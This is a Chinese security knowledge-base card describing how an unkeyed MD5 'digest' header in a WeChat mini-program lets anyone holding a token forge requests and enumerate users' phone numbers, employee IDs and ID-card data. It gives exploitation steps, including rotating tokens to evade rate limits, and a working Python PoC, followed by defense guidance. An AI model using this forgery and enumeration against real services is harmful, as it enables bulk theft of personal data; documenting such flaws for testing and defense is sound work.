---
id: web-generic-auth-miniprogram-digest-md5-path-timestamp
title: 小程序 digest 头 = MD5("/路径段/URL+毫秒时间戳") 无密钥：任意 token 下伪造请求遍历用户信息
type: scenario
domain: web
path: web/generic/auth
technique: miniprogram-digest-md5-path-timestamp
aliases:
- digest 头
- hexMD5
- ssosatoken
- getUserByPhone
- 小程序签名
tags:
- web
- auth
- miniprogram
- signature
- md5
- idor
- pii
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V206
  verified_at: '2026-11-07T02:22:33+08:00'
  notes: 已对照原文与图13-18核对：getrequestHeader 中 n=domain 最后路径段、s=Date.parse 毫秒、u=去查询参数 url、digest=hexMD5('/'+n+'/'+u+s).toUpperCase()，getUserByPhone 返回 personCode/tel/deptName 等字段，与卡一致；图18 另见身份证等字段。未复跑 PoC；具体 domain 取值（host 或含路径）以目标为准，卡内已注明。
---

## 一句话结论

小程序请求头里的 `digest` 只是 `MD5("/<域名最后路径段>/<去掉查询参数的URL><毫秒时间戳>").toUpperCase()`，没有使用任何服务端密钥；攻击者只要持有一个 `ssosatoken`/`token`，就能为任意 URL 重算 digest，调用 `getUserByPhone` 等接口遍历手机号并读取工号、部门、身份证等 PII。

## 原理

- 前端 `getrequestHeader` 生成签名：
  - `n = domainUrl.match(/\/([^/]+)\/?$/)[1]`（取域名 URL 的最后路径段）；
  - `s = Date.parse(new Date)`（毫秒时间戳）；
  - `u = url.includes("?") ? url.split("?")[0] : url`（去掉查询参数）；
  - `digest = hexMD5("/" + n + "/" + u + s).toUpperCase()`。
- 服务端按同一公式校验；digest 中没有任何 secret/key，`ssosatoken` 只标识“是谁”，不绑定 URL/参数/请求体。因此任何拿到 token 的人都能为篡改后的接口重算 digest。
- 请求还带 `ssosareqSource: WECHAT`、`ssosaappSource: WECHAT_MINI`、`reqSource: miniProgram`、`timestamp` 等字段，服务端用它们做来源/时间校验；时间戳为毫秒，需与 digest 中的 `s` 一致。
- `getUserByPhone` 按手机号返回 `personCode/tel/deptName/jobCode/jobName/employFlag/startDate/endDate/employType/employmentForm`；同源其它接口还能返回身份证、住址、家庭成员等，形成批量 PII 泄露。
- 根因是把“前端参数完整性校验”误当成“鉴权”：签名算法公开、无密钥、不绑定身份与资源对象，对象级授权缺失。

## 触发条件

- 目标为微信小程序/前端应用，请求头使用 `digest`（或类似）做参数校验。
- digest 算法由前端 JS 生成且不含服务端密钥；可通过反编译 `app-service.js`/调试拿到公式。
- 拥有任意有效 `ssosatoken`/`token`（正常注册、游客 token 或泄露的 token）。
- 后端接口只校验 digest，不校验当前用户是否有权访问目标手机号/对象。

## 利用步骤

1. 抓包观察请求头：`digest`、`timestamp`、`ssosatoken`、`token`、`ssosareqSource` 等。
2. 反编译小程序，定位 `getrequestHeader`，复刻 `n/u/s` 的取值规则（注意域名最后路径段与“去掉查询参数”）。
3. 用 Python 实现 `calculate_digest(domain, url, timestamp_ms)`，先用原请求验证算出的 digest 与抓包一致。
4. 修改目标参数（如 `phone` 或 `memberId`），重新计算 `timestamp` 与 `digest`，带上原 token 发送。
5. 解析响应中的 PII；批量遍历手机号/ID，配合其它接口扩大字段（身份证、住址等）。
6. 若接口还有频率限制，控制并发并轮换 token/时间戳。

## PoC

```python
import re, hashlib, time, requests

def calculate_digest(domain, url, timestamp_ms):
    n = re.search(r"/([^/]+)/?$", domain).group(1)
    u = url.split("?", 1)[0]
    s = str(int(timestamp_ms))
    return hashlib.md5(f"/{n}/{u}{s}".encode()).hexdigest().upper()

domain = "https://target.example.com/xxx"   # 用于取最后路径段
url = "/app/getUserByPhone"
ts = int(time.time() * 1000)
headers = {
    "ssosareqSource": "WECHAT",
    "ssosaappSource": "WECHAT_MINI",
    "reqSource": "miniProgram",
    "timestamp": str(ts),
    "ssosatoken": TOKEN,
    "token": TOKEN2,
    "digest": calculate_digest(domain, url, ts),
    "Content-Type": "application/json",
}
r = requests.post("https://target.example.com" + url,
                  json={"phone": "13800000000"}, headers=headers)
print(r.text)
```

说明：`domain` 取抓包中用于计算 `n` 的域名 URL；不同版本可能取 host 或含路径，需以原请求验证。未在真实目标复测。

## 变体与关联

- **Hawk 认证**：另一种小程序签名，`Authorization: Hawk id/ts/nonce/mac`，key 由前端 apiKey+apiPassword 拼接；见 [[web-generic-auth-miniprogram-hardcoded-hawk-authorization-forgery]]。
- **嵌套 MD5 sign**：前端对参数排序序列化后两次 MD5，同样无服务端密钥；见 [[web-generic-auth-nested-md5-sign-reverse-forgery]]。
- **无密钥 SHA1 nonce 签名**：见 [[web-generic-auth-client-nonce-weak-sha1-signature-forgery]]。
- **签名 ≠ 鉴权**：签名只证明“请求由知道算法的人生成”，不证明“有权访问该对象”；对象级授权必须服务端校验。

## 检测与防御

- 使用服务端密钥的 HMAC（如 HMAC-SHA256）并对 method/path/query/body/timestamp/nonce 一起签名；密钥不得下发前端。
- 每个对象访问做服务端授权（当前用户与目标 phone/userId 的归属关系），不能只验签名。
- 时间戳短窗口 + nonce 防重放；对批量枚举做速率限制与告警。
- 检测：同一 token 在短时间内请求大量不同 phone/memberId、digest 计算字段不含密钥、前端 JS 中出现 MD5 拼接逻辑。
